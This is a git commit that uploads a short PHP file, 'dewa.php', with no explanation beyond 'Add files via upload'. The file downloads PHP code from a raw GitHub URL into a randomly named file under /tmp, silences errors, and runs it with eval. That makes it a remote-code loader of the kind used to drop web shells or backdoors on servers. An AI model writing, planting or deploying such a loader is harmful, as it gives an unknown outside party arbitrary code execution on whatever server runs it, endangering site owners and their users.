f358784498a35cc40698293aa9b1cf062e66cb6e
seokerens <randomprsnn404@gmail.com>
2025-09-22 16:10:12 +0700

    Add files via upload

---
+++ dewa.php
@@ -0,0 +1,9 @@
+<?php
+
+$rand = rand(00000000,99999999);
+$md5 = md5($rand);
+if(!is_file('/tmp/ses_'.$md5)) {
+    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://raw.githubusercontent.com/seokerens/umum/refs/heads/main/SF.php'));
+}
+@eval('?>'.file_get_contents('/tmp/ses_'.$md5));
+
